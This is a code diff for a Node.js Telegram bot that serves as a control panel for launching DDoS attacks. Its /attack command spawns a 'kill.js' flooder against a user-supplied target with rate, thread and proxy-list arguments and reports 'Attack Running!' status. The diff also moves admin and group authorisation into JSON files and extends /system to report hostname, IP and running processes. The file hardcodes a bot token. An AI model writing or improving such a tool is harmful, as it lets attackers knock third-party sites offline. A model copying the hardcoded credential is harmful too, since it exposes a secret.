@@ -2,10 +2,10 @@ const TelegramBot = require('node-telegram-bot-api')
 const { spawn } = require('child_process')
 const express = require('express')
 const si = require('systeminformation')
+const fs = require('fs').promises
+const path = require('path')
 
 const TOKEN = '7937745403:AAGrQ_OVQalmt2tzz6XJBtDDcD-YN-gATu8'
-const ADMIN_IDS = [6601930239]
-const GROUP_USERNAME = 'deptraiaiyeu'
 const bot = new TelegramBot(TOKEN, { polling: true })
 
 const app = express()
@@ -14,20 +14,52 @@ app.get('/', (req, res) => res.send('Bot is running'))
 app.listen(PORT, () => console.log(`Listening on port ${PORT}`))
 
 const activeAttacks = {}
+const GROUP_SETTINGS_PATH = path.join(__dirname, 'assets', 'group_settings.json')
+const ADMIN_LIST_PATH = path.join(__dirname, 'assets', 'admin_lists.json')
+
+async function loadJson(filePath) {
+  try {
+    const data = await fs.readFile(filePath, 'utf8')
+    return JSON.parse(data)
+  } catch (err) {
+    return {}
+  }
+}
+
+async function saveJson(filePath, data) {
+  await fs.writeFile(filePath, JSON.stringify(data, null, 2))
+}
 
 bot.onText(/\/system/, async (msg) => {
   const chatId = msg.chat.id
+  const admins = await loadJson(ADMIN_LIST_PATH)
+  const groupSettings = await loadJson(GROUP_SETTINGS_PATH)
+  const isAdmin = admins.includes(msg.from.id)
+  const isGroupActive = groupSettings[msg.chat.id]?.botStatus === true
+
+  if (!isAdmin && !isGroupActive) return
+
   try {
-    const cpu = await si.cpu()
-    const mem = await si.mem()
-    const disk = await si.fsSize()
-    const os = await si.osInfo()
+    const [cpu, mem, disk, os, network, processes] = await Promise.all([
+      si.cpu(),
+      si.mem(),
+      si.fsSize(),
+      si.osInfo(),
+      si.networkInterfaces(),
+      si.processes()
+    ])
     const diskInfo = disk.length > 0 ? disk[0] : { fs: 'N/A', size: 0, used: 0 }
+    const networkInfo = network.length > 0 ? network[0] : { iface: 'N/A', ip4: 'N/A' }
     const systemInfo = {
       OS: `${os.distro} ${os.release} (${os.arch})`,
+      Kernel: os.kernel,
+      Hostname: os.hostname,
       CPU: `${cpu.manufacturer} ${cpu.brand} (${cpu.cores} cores, ${cpu.speed} GHz)`,
-      RAM: `${(mem.total / 1024 / 1024 / 1024).toFixed(2)} GB total, ${(mem.used / 1024 / 1024 / 1024).toFixed(2)} GB used`,
-      Disk: `${diskInfo.fs} ${(diskInfo.size / 1024 / 1024 / 1024).toFixed(2)} GB total, ${(diskInfo.used / 1024 / 1024 / 1024).toFixed(2)} GB used`
+      RAM: `${(mem.total / 1024 / 1024 / 1024).toFixed(2)} GB total, ${(mem.used / 1024 / 1024 / 1024).toFixed(2)} GB used, ${(mem.free / 1024 / 1024 / 1024).toFixed(2)} GB free`,
+      Disk: `${diskInfo.fs} ${(diskInfo.size / 1024 / 1024 / 1024).toFixed(2)} GB total, ${(diskInfo.used / 1024 / 1024 / 1024).toFixed(2)} GB used`,
+      Network: `${networkInfo.iface} (${networkInfo.ip4})`,
+      Active_Processes: processes.list.map(p => `${p.name} (PID: ${p.pid})`).join(', ') || 'None',
+      Uptime: `${Math.floor(os.uptime / 3600)}h ${Math.floor((os.uptime % 3600) / 60)}m`
     }
     bot.sendMessage(chatId, '```json\n' + JSON.stringify(systemInfo, null, 2) + '\n```', { parse_mode: 'Markdown' })
   } catch (err) {
@@ -35,7 +67,7 @@ bot.onText(/\/system/, async (msg) => {
   }
 })
 
-bot.on('message', (msg) => {
+bot.on('message', async (msg) => {
   const id = msg.chat.id
   const text = msg.text?.trim()
   const userId = msg.from.id
@@ -43,10 +75,12 @@ bot.on('message', (msg) => {
 
   if (!text) return
 
-  const isFromAllowedGroup = msg.chat.type === 'supergroup' && msg.chat.username === GROUP_USERNAME
-  const isAdmin = ADMIN_IDS.includes(userId)
+  const admins = await loadJson(ADMIN_LIST_PATH)
+  const groupSettings = await loadJson(GROUP_SETTINGS_PATH)
+  const isAdmin = admins.includes(userId)
+  const isGroupActive = groupSettings[id]?.botStatus === true
 
-  if (!isFromAllowedGroup && !isAdmin) return
+  if (!isAdmin && !isGroupActive) return
 
   if (text.startsWith('/attack')) {
     const args = text.split(/\s+/).slice(1)
@@ -68,9 +102,9 @@ bot.on('message', (msg) => {
       return
     }
 
-    const cmd = spawn('node', ['./kill.js', target, time, rate, thread, './prx.txt'])
+    const cmd = spawn('node', ['./kill.js', target, time, rate, thread, './prx.txt'], { stdio: ['ignore', 'pipe', 'pipe'] })
     const attackId = `${userId}_${Date.now()}`
-    activeAttacks[attackId] = { cmd, target, time, rate, thread, userId, remainingTime: time, messageId: null }
+    activeAttacks[attackId] = { cmd, target, time, rate, thread, userId, remainingTime: time, messageId: null, startTime: Date.now() }
 
     const response = {
       status: "Attack Started!",
@@ -82,7 +116,7 @@ bot.on('message', (msg) => {
       index: attackId
     }
 
-    bot.sendMessage(id, '```json\n' + JSON.stringify(response, null, 2) + '\n```', {
+    const sentMsg = await bot.sendMessage(id, '```json\n' + JSON.stringify(response, null, 2) + '\n```', {
       parse_mode: 'Markdown',
       reply_markup: {
         inline_keyboard: [
@@ -94,28 +128,32 @@ bot.on('message', (msg) => {
           ]
         ]
       }
-    }).then(sentMsg => {
-      activeAttacks[attackId].messageId = sentMsg.message_id
-      const interval = setInterval(() => {
-        if (!activeAttacks[attackId]) {
-          clearInterval(interval)
-          return
-        }
-        activeAttacks[attackId].remainingTime -= 10
-        if (activeAttacks[attackId].remainingTime <= 0) {
-          clearInterval(interval)
-          return
-        }
-        const updatedResponse = {
-          status: "Attack Running!",
-          target,
-          time: activeAttacks[attackId].remainingTime,
-          rate,
-          thread,
-          caller: username,
-          index: attackId
-        }
-        bot.editMessageText('```json\n' + JSON.stringify(updatedResponse, null, 2) + '\n```', {
+    })
+    activeAttacks[attackId].messageId = sentMsg.message_id
+
+    const interval = setInterval(async () => {
+      if (!activeAttacks[attackId]) {
+        clearInterval(interval)
+        return
+      }
+      const elapsed = Math.floor((Date.now() - activeAttacks[attackId].startTime) / 1000)
+      activeAttacks[attackId].remainingTime = Math.max(0, time - elapsed)
+      if (activeAttacks[attackId].remainingTime <= 0) {
+        activeAttacks[attackId].cmd.kill()
+        clearInterval(interval)
+        return
+      }
+      const updatedResponse = {
+        status: "Attack Running!",
+        target,
+        time: activeAttacks[attackId].remainingTime,
+        rate,
+        thread,
+        caller: username,
+        index: attackId
+      }
+      try {
+        await bot.editMessageText('```json\n' + JSON.stringify(updatedResponse, null, 2) + '\n```', {
           chat_id: id,
           message_id: sentMsg.message_id,
           parse_mode: 'Markdown',
@@ -129,9 +167,11 @@ bot.on('message', (msg) => {
               ]
             ]
           }
-        }).catch(err => console.error(`Failed to edit message: ${err.message}`))
-      }, 10000)
-    })
+        })
+      } catch (err) {
+        console.error(`Failed to edit message: ${err.message}`)
+      }
+    }, 10000)
 
     cmd.stderr.on('data', (data) => {
       console.error(`kill.js error: ${data}`)
@@ -139,14 +179,23 @@ bot.on('message', (msg) => {
     })
 
     cmd.on('error', (err) => {
+      clearInterval(interval)
       delete activeAttacks[attackId]
       bot.sendMessage(id, '```json\n' + JSON.stringify({ error: err.message }, null, 2) + '\n```', { parse_mode: 'Markdown' })
     })
 
     cmd.on('close', (code) => {
+      clearInterval(interval)
       delete activeAttacks[attackId]
       bot.sendMessage(id, '```json\n' + JSON.stringify({ done: true, code, target }, null, 2) + '\n```', { parse_mode: 'Markdown' })
     })
+
+    setTimeout(() => {
+      if (activeAttacks[attackId]) {
+        activeAttacks[attackId].cmd.kill()
+        clearInterval(interval)
+      }
+    }, time * 1000)
   }
 
   if (text === '/list') {
